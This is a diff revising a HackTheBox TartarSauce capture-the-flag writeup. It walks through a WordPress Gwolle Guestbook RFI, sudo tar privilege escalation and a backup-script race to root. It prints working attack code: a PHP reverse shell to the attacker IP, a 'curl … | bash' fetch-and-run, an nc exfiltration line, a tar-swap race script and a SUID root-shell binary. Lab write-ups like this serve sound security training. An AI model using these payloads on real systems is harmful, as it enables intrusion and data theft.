@@ -1,21 +1,32 @@
 ---
 title: TartarSauce
 author: Julien Bongars
+date: 2026-02
+link: "[app.hackthebox.com/machines/TartarSauce](https://app.hackthebox.com/machines/TartarSauce)"
 tags:
   - HackTheBox
   - Medium
   - Linux
   - Hacking
-link: "[app.hackthebox.com/machines/TartarSauce](https://app.hackthebox.com/machines/TartarSauce)"
 ---
 
-ip = 10.129.1.185
+# TartarSauce — Writeup
 
-# Description
+> Platform: HackTheBox · Difficulty: **Medium** · OS: **Linux**
+> Target: `10.129.1.185` (`tartarsauce.htb`)
+> Ref: [app.hackthebox.com/machines/TartarSauce](https://app.hackthebox.com/machines/TartarSauce)
 
-TartarSauce is a fairly challenging box that highlights the importance of a broad remote enumeration instead of focusing on obvious but potentially less fruitful attack vectors. It features a quite realistic privilege escalation requiring abuses of the tar command. Attention to detail when reviewing tool output is beneficial when attempting this machine.
+## Summary
 
-# Port scanning
+TartarSauce is a Medium Linux box where the obvious Monstra CMS path is a time-sink and the real foothold sits one directory deeper. Port 80 only; `robots.txt` lists several `/webservices/` paths including Monstra 3.0.4 (`admin:admin`), but the chunk-upload RCE returns 500 and goes nowhere. Broader gobuster under `/webservices/` finds `/wp`. Broken absolute links reveal the vhost `tartarsauce.htb`; after adding it to `/etc/hosts`, aggressive `wpscan` surfaces the **Gwolle Guestbook** plugin, which is vulnerable to unauthenticated **RFI (CVE-2015-8351)**. Hosting a malicious `wp-load.php` and hitting `ajaxresponse.php?abspath=` yields a shell as `www-data`.
+
+As `www-data`, `sudo -l` allows `tar` as `onuma`. GTFOBins-style `--checkpoint-action=exec=` drops a shell as `onuma` and the user flag. A five-minute `backuperer.timer` runs `/usr/sbin/backuperer` as root: it tars `/var/www/html` into a random file under `/var/tmp`, sleeps 30s, extracts, and `diff`s. Swapping that archive mid-flight for a tarball whose extract tree contains a symlink into `/root` makes the integrity-check `diff` print the root flag into `/var/backups/onuma_backup_error.txt`. The same race can drop a root-owned SUID binary for a full root shell. Intended dead ends: grinding Monstra, chasing WordPress DB creds as `www-data`, and hunting an SSH password when port 22 is not open.
+
+---
+
+## Recon
+
+### Port scanning
 
 **rustscan**
 
@@ -46,7 +57,9 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 9.56 seconds
 ```
 
-# Enumeration
+Only HTTP on 80. The artifact that matters in the scan is `robots.txt` leaking five `/webservices/` paths.
+
+### Enumeration
 
 ```robots.txt
 User-agent: *
@@ -57,21 +70,25 @@ Disallow: /webservices/developmental/
 Disallow: /webservices/phpmyadmin/
 ```
 
-## Monstra CRM
+#### Monstra CRM
 
-http://<IP-ADDRESS> /webservices/monstra-3.0.4/
+`http://<IP-ADDRESS>/webservices/monstra-3.0.4/`
 
 ![](.media/20260206222323.png)
 
-We download the source code for monstra CRM - https://github.com/monstra-cms/monstra/releases/download/v3.0.4/monstra-3.0.4.zip
+Source for the installed version is available upstream: https://github.com/monstra-cms/monstra/releases/download/v3.0.4/monstra-3.0.4.zip
 
-there is an admin login page : http://10.129.1.185/webservices/monstra-3.0.4/admin/index.php?id=pages
+Admin login at `http://10.129.1.185/webservices/monstra-3.0.4/admin/index.php?id=pages`:
 
 ![](.media/20260206223153.png)
 
-found the password which is username: admin, password: admin
+Credentials are `admin` / `admin`.
 
-## Exploit Monstra CRM
+---
+
+## Stage 1: Dead end — Monstra theme-chunk RCE
+
+An ExploitDB Monstra 3.0.4 RCE (EDB-ID:52038, modified) was tried against the authenticated admin session:
 
 `I found the exploit here
 
@@ -165,7 +182,7 @@ else:
     print("Failed to prepare shell.")
 ```
 
-We craft the following payload:-
+Crafted chunk payload:
 
 ```json
 {
@@ -175,8 +192,6 @@ We craft the following payload:-
   "add_file": "Save"
 }
 ```
-
-curl request
 
 ```curl
 curl -X POST 'http://10.129.1.185/webservices/monstra-3.0.4/admin/index.php?id=themes&action=add_chunk' \
@@ -202,11 +217,15 @@ system($_GET["cmd"]);
   -b 'PHPSESSID=81im27r7l75dschq183ag91un5'
 ```
 
-POST request returns a 500. Looking at the guide this is probably a red hearing so will abandon this.
+The POST returns **500**. This path is a red herring — abandon Monstra for broader content discovery.
 
-## Gobuster
+Stage result: none (dead end).
 
-Enumerating the `/webservices/FUZZ` url, we find there is a `/wp` site that is up
+---
+
+## Stage 2: Gobuster → WordPress → Gwolle RFI → www-data
+
+### Gobuster under `/webservices/`
 
 ```bash
 ┌─[julien@parrot]─[~]
@@ -234,31 +253,23 @@ Finished
 └──╼ $
 ```
 
-## Wordpress Site
-
-http://<IP-ADDRESS> /webservices/wp/
-
-there is a WP site that is broken
+`/webservices/wp/` is a WordPress install that initially looks broken:
 
 ![](.media/20260207013024.png)
 
-Wordpress uses absolute links, investigating the page, we can see that links point to a vhost "tartarsauce.htb"
+Absolute links point at the vhost `tartarsauce.htb`:
 
 ![](.media/20260207013200.png)
 
-Add tartarsauce.htb to the `/etc/hosts`
+Add `tartarsauce.htb` to `/etc/hosts`:
 
 ![](.media/20260207013504.png)
 
-Site is now working properly.
-
-Navigating to `/wp-admin` brings us to the admin login page
+The site then renders correctly. `/wp-admin` presents the login page:
 
 ![](.media/20260207013612.png)
 
-We try the `admin admin` credentials, nothing.
-
-We run `wpscan --enumerate all-plugins` to see if there are any vulnerable plugins. There is this section:-
+`admin` / `admin` does not work here. `wpscan --enumerate all-plugins` (passive) finds little; aggressive mode is what surfaces the plugins that matter:
 
 ```bash
  | Version: 1.1.0 (80% confidence)
@@ -275,7 +286,7 @@ We run `wpscan --enumerate all-plugins` to see if there are any vulnerable plugi
  | Requests Remaining: 23
 ```
 
-rerunning on `aggressive` mode
+Aggressive rerun:
 
 ```bash
 [+] brute-force-login-protection
@@ -344,9 +355,7 @@ st_Forgery
  |
 ```
 
-we can do a `searchsploit` for `gwolle`
-
-found the following vulnerability:-
+`searchsploit gwolle` finds the RFI that actually leads to code execution:
 
 ```txt
   Exploit: WordPress Plugin Gwolle Guestbook 1.5.3 - Remote File Inclusion
@@ -386,7 +395,7 @@ In order to exploit this vulnerability 'allow_url_include' shall be set to 1. Ot
 Successful exploitation of this vulnerability will lead to entire WordPress installation compromise, and may even lead to the entire web server compromise.
 ```
 
-We create an exploit folder and drop the following file:-
+Host a malicious `wp-load.php` on the attacker box:
 
 ```php
 <?php
@@ -394,7 +403,7 @@ exec("python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.1
 ?>
 ```
 
-then we curl
+Trigger the include:
 
 ```bash
 ┌─[julien@parrot]─[~/.hacklas/targets/track-oscp/TartarSauce/exploit]
@@ -418,9 +427,7 @@ then we curl
 jk
 ```
 
-I got access
-
-## www-data access
+Callback lands a shell as `www-data`:
 
 ```bash
 $ whoami
@@ -476,7 +483,13 @@ $
 only useful user maybe?
 ```
 
-We find the database credentials in `/var/www/html/config.php`
+Stage result: reverse shell as `www-data`.
+
+---
+
+## Stage 3: www-data enumeration (and dead ends)
+
+WordPress DB credentials are in `/var/www/html/config.php`:
 
 ```php
 define('DB_NAME', 'wp');
@@ -485,14 +498,16 @@ define('DB_PASSWORD', 'w0rdpr3$$d@t@b@$3@cc3$$');
 define('DB_HOST', 'localhost');
 ```
 
-Can't access db as `www-data`
+### Dead end: MySQL as www-data
 
 ```bash
 ERROR 1045 (28000): Access denied for user 'www-data'@'localhost' (using password: NO)
 www-data@TartarSauce:/var/backups$
 ```
 
-There is a reference to `codemirror` in monstra
+### Dead end: Monstra writable files / CodeMirror noise
+
+There is a reference to `codemirror` in monstra:
 
 ```bash
 Only in /var/www/html/webservices/monstra-3.0.4/plugins/codemirror/codemirror: addon
@@ -523,20 +538,18 @@ don't know if this is important
 <   </article>
 ```
 
-two files seem to be writable from `www-data`
+Two files look writable as `www-data`:
 
 ```bash
 /var/www/html/webservices/monstra-3.0.4/sitemap.xml
 /var/www/html/webservices/monstra-3.0.4/storage/pages/1.page.txt
 ```
 
-editing `.../storage/pages/1.page.txt` appears to affect what appears on the webpage `/webservices/monstra-3.0.1/storage/pages/1.page.txt`
+Editing `.../storage/pages/1.page.txt` affects what appears on the webpage `/webservices/monstra-3.0.1/storage/pages/1.page.txt`:
 
 ![](.media/20260208045705.png)
 
-trying to change the site by injecting php or javascript doesn't appear to produce any results..
-
-trying to create a new file or moving to file extension I get Permission denied
+Injecting PHP or JavaScript into that page produces nothing useful. Creating a new page file or renaming the extension is denied:
 
 ```bash
 www-data@TartarSauce:/var/www/html/webservices/monstra-3.0.4/storage/pages$ echo 'page 2' > '2.page.txt'
@@ -546,17 +559,19 @@ www-data@TartarSauce:/var/www/html/webservices/monstra-3.0.4/storage/pages$ mv 1
 mv: cannot move '1.page.txt' to '1.page.php': Permission denied
 ```
 
-stuck, going to peak at the walkthrough
+The path that actually works is `sudo -l`: `www-data` can run `tar` as `onuma`.
 
-if you `sudo -l` on `www-data` you find that you can execute `tar` as `unuma`. Going to `GTFObins` you realise there is a tar command to be able to get a shell as follows.
+Stage result: confirmation that Monstra write paths and the WP DB are dead ends; sudo tar is the pivot.
+
+---
+
+## Stage 4: tar as onuma → user flag
+
+GTFOBins-style checkpoint abuse:
 
 ```bash
 sudo -u onuma tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash --checkpoint-action=exec=/bin/bashv/null --checkpoint=1
 ```
-
-you escalate as onuma
-
-## Onuma escalation to root
 
 ```bash
 www-data@TartarSauce:/$ sudo -u onuma tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash --checkpoint-action=exec=/bin/bashv/null --checkpoint=1
@@ -565,7 +580,7 @@ tar: Removing leading `/' from member names
 onuma@TartarSauce:/$
 ```
 
-you find the user flag
+User flag:
 
 ```bash
 onuma@TartarSauce:~$ cat use
@@ -574,7 +589,7 @@ cat user.txt
 onuma@TartarSauce:~$
 ```
 
-can't seem to use `sudo -l` as don't have password... going to run linenum.sh
+`sudo -l` as onuma needs a password, so local enum continues with `linenum.sh`:
 
 ```bash
 onuma@TartarSauce:~$ curl http://10.10.14.97:80/linenum.sh | bash
@@ -594,9 +609,13 @@ vice
 Enable thorough tests to see inactive timers
 ```
 
-there is a cron job that runs every 5 mins `backuperer.service`
+A `backuperer.timer` fires about every five minutes.
 
-the systemd service:
+Stage result: shell as `onuma`; user flag `4f5ffe8fd1fa8283c9284db34721d14f`.
+
+---
+
+## Stage 5: backuperer archive swap → root flag
 
 ```bash
 onuma@TartarSauce:/etc/systemd/system$ systemctl status backuperer
@@ -620,7 +639,7 @@ onuma@TartarSauce:/etc/systemd/system$ ls -l /usr/sbin/backuperer
 onuma@TartarSauce:/etc/systemd/system$ s[
 ```
 
-the backuperer file is the following
+`/usr/sbin/backuperer`:
 
 ```bash
 #!/bin/bash
@@ -684,7 +703,7 @@ else
 fi
 ```
 
-created the following exploit. The idea is to wait for the backup tar to be created and then to create a fake tar with a symbolic link that points to /root/root.txt like so
+The 30-second sleep after creating `$tmpfile` is the race window. Build a malicious tarball whose extract tree includes a symlink into `/root`, wait for the random `/var/tmp/.*` archive, overwrite it, then read the integrity-error log where `diff` dumps the root flag:
 
 ```bash
 #!/bin/bash
@@ -716,8 +735,6 @@ cat /var/backups/onuma_backup_error.txt
 cat /var/backups/onuma_backup_error.txt | nc 10.10.14.97 4443
 ```
 
-the output is the following:-
-
 ```bash
 ------------------------------------------------------------------------
 /var/tmp/.82155913218291a33fc26c8c4b7665ebad5223b4
@@ -738,11 +755,15 @@ Only in /var/www/html: webservices
 └──╼ $
 ```
 
-we get the flag.
+Root flag: `72a1391cc928341e52d421c3fcf0f7dd`.
 
-## Get root shell (side quest)
+Stage result: root flag via the integrity-check `diff` leak.
 
-There is another way to got root shell not just the root flag. Refering to this part of the code
+---
+
+## Stage 6: Side quest — SUID shell via the same race
+
+The extract step runs as root into `/var/tmp/check`. If the swapped archive contains a root-owned SUID binary, that binary can be executed for a root shell:
 
 ```bash
 /bin/tar -zxvf $tmpfile -C $check
@@ -757,10 +778,6 @@ else
 fi
 ```
 
-if you can place a executable with a SUID bit that is owned by root, you can run as user and you should be able to get a root shell.
-
-from what I understand it's something like this
-
 ```c
 #include <unistd.h>
 #include <stdlib.h>
@@ -772,7 +789,7 @@ int main() {
 }
 ```
 
-build
+Build the SUID payload and pack it:
 
 ```bash
 #!/bin/bash
@@ -793,8 +810,6 @@ tar zcvf evil.tar.gz -C evil .
 rm shell 
 rm -rf evil
 ```
-
-exploit
 
 ```bash
 #!/bin/bash
@@ -831,43 +846,45 @@ while true; do
 done
 ```
 
-I got the root flag
-
 ![](.media/20260209115013.png)
 
-# Credentials
+Stage result: root shell (and confirmation of the root flag).
 
-## monstra crm admin dashboard
+---
 
-- page = http://10.129.1.185/webservices/monstra-3.0.4/admin/index.php?id=pages
-- username = admin
-- password = admin
+## Credentials
 
-## Database Creds
+| Source | Credential | Notes |
+| --- | --- | --- |
+| Monstra admin (`/webservices/monstra-3.0.4/admin/`) | `admin:admin` | RCE path is a dead end (HTTP 500) |
+| `/var/www/html/config.php` | `wpuser` / `w0rdpr3$$d@t@b@$3@cc3$$` (DB `wp`) | Not usable as `www-data` without the password on the mysql client |
 
-```bash
-define('DB_NAME', 'wp');
-define('DB_USER', 'wpuser');
-define('DB_PASSWORD', 'w0rdpr3$$d@t@b@$3@cc3$$');
-define('DB_HOST', 'localhost');
-```
+---
 
-# References
+## Key lessons
 
-# To Improve
+- **Broad enum beats the shiny CMS.** Monstra looked like the foothold; gobuster under `/webservices/` found WordPress, which is where the box actually starts.
+- **WordPress needs aggressive plugin enum.** Passive `wpscan` missed `gwolle-gb`; aggressive mode and `searchsploit` found **CVE-2015-8351** RFI.
+- **No SSH means no password hunt for login.** After `www-data`, looking for an `onuma` password to SSH was wasted effort — port 22 is closed; `sudo -u onuma tar …` is the intended pivot.
+- **Race the backup window.** `backuperer`'s 30s sleep between `tar -zcvf` and `tar -zxvf`/`diff` is enough to swap in a symlink archive and leak `/root/root.txt` through the error log — or to drop a SUID binary for a shell.
+- **Script working exploits.** Once RFI or the backup swap works, package it so a revoked HTB completion (or a re-run) does not burn the same setup time.
 
-## Need to learn how to identify and enumerate WP sites.
+### What went right
 
-Updated Web enumeration checklist to include Wordpress and wordpress plugins
+- Eventually widening recon past Monstra and treating broken WP absolute links as a vhost clue.
+- Checklist update afterward: WordPress + plugins, and keep gobuster/ffuf running in the background during other enum.
 
-## Run Recon in the background during enumeration
+---
 
-Have reckon tasks like gobuster, ffuf, etc running in the background during an engagement
+## Tools & cheat sheet
 
-## Forgot exploit
-
-The next time I get an exploit to work, I should script the whole thing as to not waste time during the next engagement. Also useful for the next time HTB decides to revoke my completion.
-
-## No SSH port
-
-When I got an initial foothold with `www-data` I was so preoccupied trying to find a password to login as omni that I forgot there was no ssh port. Should have realised I would run `sudo -u omni` with tar.
+| Tool | Purpose in this box | Key command |
+| --- | --- | --- |
+| `nmap` / `rustscan` | Port / service discovery | `nmap -sC -sV -oA ./nmap/quick.nmap 10.129.1.185` |
+| `gobuster` | Find `/webservices/wp/` | `gobuster dir -w …/directory-list-2.3-medium.txt -u 'http://10.129.1.185/webservices/'` |
+| `wpscan` | Aggressive plugin discovery (`gwolle-gb`) | `wpscan --enumerate all-plugins` (aggressive) |
+| `searchsploit` | Gwolle RFI advisory / PoC | `searchsploit gwolle` |
+| Gwolle RFI + `wp-load.php` | Unauth RCE as `www-data` | `curl '…/ajaxresponse.php?abspath=http://10.10.14.97/'` |
+| `sudo tar` (GTFOBins) | Escalate `www-data` → `onuma` | `sudo -u onuma tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash …` |
+| `linenum.sh` | Spot `backuperer.timer` | `curl http://10.10.14.97:80/linenum.sh \| bash` |
+| Archive-swap exploit | Race `backuperer` → root flag / SUID shell | swap `/var/tmp/.*` with symlink (or SUID) tarball during the 30s sleep |
